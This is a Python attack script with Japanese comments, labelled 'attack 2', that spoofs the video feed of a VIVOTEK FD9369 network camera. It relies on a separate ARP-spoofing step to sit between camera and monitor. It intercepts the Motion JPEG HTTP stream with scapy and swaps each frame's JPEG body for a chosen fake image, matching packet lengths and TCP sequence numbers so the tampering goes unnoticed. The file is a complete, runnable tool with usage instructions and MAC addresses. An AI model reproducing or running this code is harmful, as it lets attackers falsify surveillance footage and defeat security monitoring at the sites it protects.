#!/usr/bin/env python3
"""
vivotek_attack2_fake.py - 攻撃② 偽画像送信による映像偽装
対象: VIVOTEK FD9369 (Motion JPEG over HTTP)

parapara.py のアーキテクチャを採用:
- パケット長は元と完全一致させる（TCP整合性を維持）
- Content-Length ベースで JPEG 本文を正確に判別
- seq 順序制御: 順序通りのパケットのみ差し替え、再送は透過
- JPEG 本文を偽画像データに差し替え (足りなければ 0x22 パディング)
- TCP seq/ack は元パケットのまま変更しない
- 自作ACKは送らない

使い方:
  1. arp_spoofing.py を先に起動
  2. fake 画像を用意 (JPEG, できるだけ小さいサイズ推奨)
  3. 本スクリプトを別ターミナルで実行

  python vivotek_attack2_fake.py --camera-mac 08:00:23:9C:31:FF \\
      --monitor-mac D0:BF:9C:E2:25:2D --attacker-mac A0:CE:C8:A4:EB:D5 \\
      --fake-image fake.jpg
"""

import argparse
import re
import sys
import threading
from scapy.all import *

# ==== MJPEG 解析用 ====
BOUNDARY = b"--myboundary"
RE_CT = re.compile(br"Content[- ]type:\s*image/jpeg", re.IGNORECASE)
RE_CL = re.compile(br"Content[- ]length:\s*(\d+)", re.IGNORECASE)
MIN_JPEG_LEN = 64
REG_KEEP = max(len(BOUNDARY) + 4, 128)
HDRBUF_CAP = 16384

PADDING_BYTE = b"\x22"


class Flow:
    """TCPフローごとの MJPEG パーサ状態"""
    __slots__ = (
        "phase", "hdr_buf", "body_left",
        "cur_off", "tail_reg", "next_seq_cam"
    )

    def __init__(self):
        self.phase = "HEADER_WAIT"
        self.hdr_buf = b""
        self.body_left = 0
        self.cur_off = 0
        self.tail_reg = b""
        self.next_seq_cam = None


def load_fake_image(path):
    """偽画像ファイルを読み込み、memoryview として返す"""
    try:
        with open(path, 'rb') as f:
            data = f.read()
    except FileNotFoundError:
        print(f"[!] 画像ファイルが見つかりません: {path}")
        sys.exit(1)

    if len(data) < 4 or data[:2] != b'\xff\xd8' or data[-2:] != b'\xff\xd9':
        print(f"[!] 有効な JPEG ファイルではありません: {path}")
        sys.exit(1)

    print(f"[+] 偽画像読み込み完了: {path} ({len(data)} バイト)")
    return memoryview(data)


# パディングブロック (事前生成)
_PAD_BLOCK = memoryview(PADDING_BYTE * 65536)


def _emit_from_img(out, pos, need, img_mv, off):
    """偽画像データを出力バッファに書き込む"""
    blen = len(img_mv)
    rem = need
    co = off
    while rem and co < blen:
        take = blen - co
        if take > rem:
            take = rem
        out[pos:pos + take] = img_mv[co:co + take]
        pos += take
        co += take
        rem -= take
    return pos, co, rem


def _emit_pad(out, pos, need):
    """パディングを出力バッファに書き込む"""
    vlen = len(_PAD_BLOCK)
    rem = need
    while rem:
        take = vlen if rem > vlen else rem
        out[pos:pos + take] = _PAD_BLOCK[:take]
        pos += take
        rem -= take
    return pos


def _transform_fake(raw, st, img_mv):
    """
    MJPEG ストリームを Content-Length ベースでパースし、
    JPEG 本文部分を偽画像データに差し替える。
    パケット長は元と完全一致。足りなければ 0x22 でパディング。
    """
    L = len(raw)
    out = bytearray(L)
    out_pos = 0
    i = 0

    while i < L:
        if st.phase == "HEADER_WAIT":
            remain = raw[i:]
            hb = st.hdr_buf
            buf = (hb[-HDRBUF_CAP:] + remain) if hb else remain
            pos = buf.find(b"\r\n\r\n")

            if pos == -1:
                out[out_pos:out_pos + len(remain)] = remain
                out_pos += len(remain)
                nb = (hb + remain) if hb else remain
                if len(nb) > HDRBUF_CAP:
                    nb = nb[-HDRBUF_CAP:]
                st.hdr_buf = nb
                break
            else:
                hdr_total = pos + 4
                cur_have = len(hb)
                need = hdr_total - cur_have
                if need > 0:
                    part = remain[:need]
                    out[out_pos:out_pos + need] = part
                    out_pos += need
                    i += need

                full_hdr = (hb + remain[:max(0, need)])[:hdr_total] if cur_have else remain[:hdr_total]
                is_jpeg = RE_CT.search(full_hdr) is not None
                mcl = RE_CL.search(full_hdr)
                declared = int(mcl.group(1)) if mcl else None

                if is_jpeg and declared is not None and declared >= MIN_JPEG_LEN:
                    st.phase = "BODY_LEN"
                    st.hdr_buf = b""
                    st.body_left = declared
                    st.cur_off = 0
                    st.tail_reg = b""
                    continue
                else:
                    st.hdr_buf = b""
                    rem = raw[i:L]
                    if rem:
                        out[out_pos:out_pos + len(rem)] = rem
                        out_pos += len(rem)
                    break

        elif st.phase == "BODY_LEN":
            tail = st.tail_reg
            combined = tail + raw[i:L]
            bpos = combined.find(BOUNDARY)
            rem_pkt = L - i
            need = min(rem_pkt, st.body_left)

            if bpos != -1:
                # boundary が見つかった → そこまでを本文として置換
                start_in_cur = bpos - len(tail)
                if start_in_cur < 0:
                    start_in_cur = 0
                cut = min(need, start_in_cur)

                out_pos, st.cur_off, rem_need = _emit_from_img(
                    out, out_pos, cut, img_mv, st.cur_off)
                if rem_need:
                    out_pos = _emit_pad(out, out_pos, rem_need)
                i += cut
                st.body_left -= cut

                if i < L:
                    rem = raw[i:L]
                    out[out_pos:out_pos + len(rem)] = rem
                    out_pos += len(rem)
                    nb = st.hdr_buf + rem
                    if len(nb) > HDRBUF_CAP:
                        nb = nb[-HDRBUF_CAP:]
                    st.hdr_buf = nb

                st.phase = "HEADER_WAIT"
                st.cur_off = 0
                st.tail_reg = b""
                break

            # boundary なし → 偽画像データで置換
            out_pos, st.cur_off, rem_need = _emit_from_img(
                out, out_pos, need, img_mv, st.cur_off)
            if rem_need:
                out_pos = _emit_pad(out, out_pos, rem_need)

            # boundary 監視用のテールレジスタを更新
            seg = raw[i:i + need]
            tr = st.tail_reg
            if len(tr) + need <= REG_KEEP:
                st.tail_reg = tr + seg
            else:
                cut_from_tail = max(0, len(tr) - (REG_KEEP - need))
                st.tail_reg = (tr[cut_from_tail:] + seg)[-REG_KEEP:]

            i += need
            st.body_left -= need

            if st.body_left <= 0:
                st.phase = "HEADER_WAIT"
                st.cur_off = 0
                st.tail_reg = b""
                if i < L:
                    rem = raw[i:L]
                    out[out_pos:out_pos + len(rem)] = rem
                    out_pos += len(rem)
                    nb = st.hdr_buf + rem
                    if len(nb) > HDRBUF_CAP:
                        nb = nb[-HDRBUF_CAP:]
                    st.hdr_buf = nb
                break
        else:
            st.phase = "HEADER_WAIT"
            st.hdr_buf = b""
            st.tail_reg = b""

    # パケット長を元と一致させる
    if out_pos < L:
        out_pos = _emit_pad(out, out_pos, L - out_pos)
    elif out_pos > L:
        del out[L:]

    return bytes(out)


def main():
    parser = argparse.ArgumentParser(
        description="攻撃② 偽画像送信による映像偽装 (VIVOTEK FD9369)")
    parser.add_argument("--camera-mac", required=True,
                        help="監視カメラの MAC アドレス")
    parser.add_argument("--monitor-mac", required=True,
                        help="監視端末の MAC アドレス")
    parser.add_argument("--attacker-mac", required=True,
                        help="攻撃用 PC の MAC アドレス")
    parser.add_argument("--fake-image", required=True,
                        help="偽装に使う JPEG 画像ファイルのパス")
    parser.add_argument("--iface", default="イーサネット",
                        help="ネットワークインターフェース名 (デフォルト: イーサネット)")
    args = parser.parse_args()

    mac0 = args.attacker_mac.lower()
    mac1 = args.camera_mac.lower()
    mac2 = args.monitor_mac.lower()
    IF = args.iface

    FILT = "tcp port 80 and ether dst " + mac0

    # 偽画像の読み込み
    img_mv = load_fake_image(args.fake_image)

    # Silence scapy
    conf.verb = False
    conf.use_pcap = True

    # L2 ソケットを事前に開く (高速化)
    tx = conf.L2socket(iface=IF)

    # フロー状態管理
    flows = {}
    flow_lock = threading.Lock()

    def _recalc_and_send(pkt):
        if pkt.haslayer(IP):
            pkt[IP].len = None
            pkt[IP].chksum = None
        if pkt.haslayer(TCP):
            pkt[TCP].chksum = None
        tx.send(bytes(pkt))

    def maeta(pkt):
        if not pkt.haslayer(Ether):
            return
        src = pkt[Ether].src.lower()

        # 監視PC → カメラ: そのまま転送
        if src == mac2:
            q = pkt.copy()
            q[Ether].src = mac0
            q[Ether].dst = mac1
            _recalc_and_send(q)
            return

        # カメラ → 監視PC
        if src == mac1:
            if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
                q = pkt.copy()
                q[Ether].src = mac0
                q[Ether].dst = mac2
                _recalc_and_send(q)
                return

            tcp = pkt[TCP]
            raw_layer = pkt.getlayer(Raw)
            key = (pkt[IP].src, tcp.sport, pkt[IP].dst, tcp.dport)

            # データ無し (ACK等) はそのまま転送
            if raw_layer is None:
                q = pkt.copy()
                q[Ether].src = mac0
                q[Ether].dst = mac2
                _recalc_and_send(q)
                return

            seg_seq = int(tcp.seq)
            seg_len = len(raw_layer.load)

            with flow_lock:
                st = flows.get(key)
                if st is None:
                    st = Flow()
                    flows[key] = st
                expected = st.next_seq_cam

            # 初回: 基準確定
            if expected is None:
                out = _transform_fake(raw_layer.load, st, img_mv)
                p = pkt.copy()
                if p.haslayer(Raw):
                    p[Raw].load = out
                else:
                    p = p / Raw(load=out)
                p[Ether].src = mac0
                p[Ether].dst = mac2
                _recalc_and_send(p)
                with flow_lock:
                    st.next_seq_cam = seg_seq + seg_len
                return

            # 順序外・再送はそのまま透過
            if seg_seq != expected:
                q = pkt.copy()
                q[Ether].src = mac0
                q[Ether].dst = mac2
                _recalc_and_send(q)
                return

            # 順序通り: 偽画像で差し替えて転送
            out = _transform_fake(raw_layer.load, st, img_mv)
            p = pkt.copy()
            if p.haslayer(Raw):
                p[Raw].load = out
            else:
                p = p / Raw(load=out)
            p[Ether].src = mac0
            p[Ether].dst = mac2
            _recalc_and_send(p)
            with flow_lock:
                st.next_seq_cam = expected + seg_len

    print("=" * 55)
    print("  攻撃② 偽画像送信による映像偽装")
    print("  対象: VIVOTEK FD9369 (Motion JPEG)")
    print("=" * 55)
    print(f"  カメラ   MAC : {mac1}")
    print(f"  監視PC   MAC : {mac2}")
    print(f"  攻撃PC   MAC : {mac0}")
    print(f"  偽画像        : {args.fake_image}")
    print(f"  フィルタ      : {FILT}")
    print("=" * 55)
    print("[*] パケット中継開始... (Ctrl+C で終了)")
    print()

    sniff(iface=IF, filter=FILT, store=0, prn=maeta)


if __name__ == "__main__":
    main()
